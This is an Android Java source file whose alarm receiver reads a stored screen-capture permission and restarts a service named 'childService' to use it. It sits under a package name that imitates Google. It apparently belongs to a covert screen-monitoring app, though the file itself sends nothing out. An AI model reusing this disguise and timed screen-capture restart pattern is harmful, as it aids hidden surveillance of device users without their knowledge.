package com.google.cloudservices;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.support.v4.content.ContextCompat;

public class AllarmReceiver extends BroadcastReceiver {
    static final String EXTRA_RESULT_CODE="resultCode";
    static final String EXTRA_RESULT_INTENT="resultIntent";
    private int resultCode=0,mScreenDensity;
    private Intent resultData;
    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        WakeLocker.acquire(context);
        WakeLocker.release();
        if (intent!=null){
            resultCode=intent.getIntExtra(EXTRA_RESULT_CODE, 1337);
            resultData=intent.getParcelableExtra(EXTRA_RESULT_INTENT);
            mScreenDensity=intent.getIntExtra("density",1337);}
        Intent intent2=new Intent(context,childService.class);
                                                intent2.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                                intent2.putExtra(childService.EXTRA_RESULT_CODE, resultCode)
                                                .putExtra(childService.EXTRA_RESULT_INTENT, resultData)
                                                .putExtra("density", mScreenDensity);
//                                        ContextCompat.startForegroundService(context,intent2);
                                        context.startService(intent2);
    }
}
